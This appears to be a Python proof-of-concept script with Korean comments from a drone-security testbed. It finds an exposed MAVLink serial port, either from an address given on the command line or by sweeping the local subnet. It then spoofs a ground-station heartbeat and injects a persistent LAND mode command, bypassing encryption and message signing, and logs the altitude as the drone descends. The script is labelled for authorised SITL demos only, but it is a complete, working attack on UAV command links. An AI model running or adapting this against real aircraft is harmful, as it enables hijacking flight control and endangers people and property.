#!/usr/bin/env python3
"""land_demo.py — 지속 착륙 시각화 주입기 (5762 직결 DO_SET_MODE 9=LAND, 복원 없음).

노출된 SITL 시리얼(tcp:<uav>:5762, H1)에 직결해 LAND(9) 를 발행한다. ARIA·MAVLink 서명을
관통(직접 시리얼). 복원(revert) 없이 지속 → 드론이 실제 하강하고 대시보드 Altitude 가 0 으로 떨어짐.
공격자 시점(attacker_ue netns)에서 실행하면 UE 격리 부재(H6)로 UAV UE 에 측면 도달.

사용: python3 land_demo.py [uav_ip]   (ip 미지정/실패 시 UE풀 스윕으로 자가발견)
※ 인가된 격리 테스트베드(SITL)·명시 승인 하 지속 착륙 데모 전용.
"""
import sys, time, socket, ipaddress, subprocess
from pymavlink import mavutil

UAV_PORT = 5762


def log(*a):
    print(*a, flush=True)


def discover():
    out = subprocess.run(["ip", "-o", "-4", "route", "show", "scope", "link"],
                         capture_output=True, text=True).stdout
    for ln in out.splitlines():
        t = ln.split()
        if t and "/" in t[0]:
            try:
                net = ipaddress.ip_network(t[0], strict=False)
            except Exception:
                continue
            for ip in list(net.hosts())[:32]:
                s = socket.socket(); s.settimeout(0.8)
                try:
                    s.connect((str(ip), UAV_PORT)); s.close()
                except Exception:
                    continue
                try:
                    mm = mavutil.mavlink_connection("tcp:%s:%d" % (ip, UAV_PORT))
                    hb = mm.wait_heartbeat(timeout=5); mm.close()
                    if hb and hb.get_srcSystem() == 1 and int(hb.type) == 2:
                        return "tcp:%s:%d" % (ip, UAV_PORT)
                except Exception:
                    pass
    return None


def read(m, dur=3):
    mode = None; rel = None; end = time.time() + dur
    while time.time() < end:
        msg = m.recv_match(type=["HEARTBEAT", "GLOBAL_POSITION_INT"], blocking=True, timeout=1)
        if not msg:
            continue
        if msg.get_type() == "HEARTBEAT" and msg.get_srcComponent() == 1:
            mode = msg.custom_mode
        if msg.get_type() == "GLOBAL_POSITION_INT":
            rel = round(msg.relative_alt / 1000.0, 2)
    return mode, rel


def main():
    arg = sys.argv[1] if len(sys.argv) > 1 else None
    conn = ("tcp:%s:%d" % (arg, UAV_PORT)) if arg else None
    m = None
    if conn:
        try:
            m = mavutil.mavlink_connection(conn, source_system=255, source_component=190)
            if m.wait_heartbeat(timeout=8) is None:
                m = None
        except Exception:
            m = None
    if m is None:
        conn = discover()
        if not conn:
            log("TARGET none - unreachable"); return 1
        m = mavutil.mavlink_connection(conn, source_system=255, source_component=190)
        m.wait_heartbeat(timeout=10)
    log("TARGET", conn)

    bm, br = read(m, 4)
    log("BASELINE mode=%s rel_alt=%s" % (bm, br))

    for _ in range(5):
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        time.sleep(0.05)
    m.mav.command_long_send(1, 1, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 9, 0, 0, 0, 0, 0)
    log("INJECTED DO_SET_MODE 9 (LAND) via 5762 - ARIA+signing bypassed - NO revert")

    end = time.time() + 110
    while time.time() < end:
        mode, rel = read(m, 2)
        log("t=%s mode=%s rel_alt=%s" % (time.strftime("%H:%M:%S"), mode, rel))
        if rel is not None and rel <= 0.3:
            log("LANDED rel_alt<=0.3m"); break
    log("DONE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
